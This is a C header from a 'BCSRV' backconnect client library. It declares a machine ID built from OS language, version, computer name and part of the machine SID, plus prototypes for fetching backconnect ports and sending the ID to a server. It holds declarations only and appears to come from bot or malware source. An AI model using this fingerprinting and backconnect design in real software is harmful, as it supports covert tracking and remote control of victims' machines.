/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BCSRV project. Version 1.0
//	
// module: bcclient.h
// $Revision: 37 $
// $Date: 2014-02-19 19:33:48 +0300 (Ср, 19 фев 2014) $
// description:
//	BC-Server client library. Main definition file.

// OS version codes
#define	VER_ID_2000			L'1'
#define VER_ID_XP			L'2'
#define	VER_ID_2003			L'3'
#define	VER_ID_VISTA		L'4'
#define	VER_ID_2008			L'5'
#define	VER_ID_WIN7			L'7'
#define	VER_ID_2008R2		L'8'
#define	VER_ID_WIN8			L'9'

//#define	_BC_GENERATE_ID		TRUE

// Length of the fields of BC_MACHINE_ID structure
#define	LANGUAGE_ID_LEN		2
#define	VERSION_ID_LEN		2
#define	MACHINE_NAME_LEN	8
#define	MACHINE_ID_LEN		10


// Client machine ID structure
typedef union _BC_MACHINE_ID
{
	struct 
	{
		WCHAR	Language[LANGUAGE_ID_LEN];		// default OS language (RU/UK/CA/ES/DE etc...)
		WCHAR	Delimiter0;						// delimiter, must be "-"
		WCHAR	OsVersion[VERSION_ID_LEN];		// OS version index (VER_ID_XXX) + OS service pack index (WCHAR)
		WCHAR	Delimiter1;						// delimiter, must be "-"
		WCHAR	MachineName[MACHINE_NAME_LEN];	// current computer name 
		WCHAR	Delimiter2;						// delimiter, must me "-"
		WCHAR	MachineId[MACHINE_ID_LEN];		// last 10 chars of machine SID
	};
	CHAR	String[(LANGUAGE_ID_LEN + 1 + VERSION_ID_LEN + 1 + MACHINE_NAME_LEN + 1 + MACHINE_ID_LEN + 1) * sizeof(WCHAR)];
	WCHAR	Padding[LANGUAGE_ID_LEN + 1 + VERSION_ID_LEN + 1 + MACHINE_NAME_LEN + 1 + MACHINE_ID_LEN + 1];
} BC_MACHINE_ID, *PBC_MACHINE_ID;

typedef struct _BC_ID
{
	BC_MACHINE_ID	MachineId;
	ULONG			Crc32;
} BC_ID, *PBC_ID;


// BC-Server pair of TCP ports
typedef struct _BC_CONNECTION_PAIR
{
	USHORT	ServerPort;
	USHORT	ClientPort;
} BC_CONNECTION_PAIR, *PBC_CONNECTION_PAIR;


//
//	Returns connection pair (of TCP ports) of a backconnect server.
//
WINERROR _stdcall BcGetConnectionPair(
	SOCKADDR_IN*			pServerAddress,
	PBC_CONNECTION_PAIR		pConnectionPair,
	LPSTR					pClientId
	);

WINERROR _stdcall BcSendClientId(
	SOCKET	Socket,
	LPSTR	pClientId
	);

VOID _stdcall BcCreateSystemId(
	PBC_MACHINE_ID	pSystemId
	);
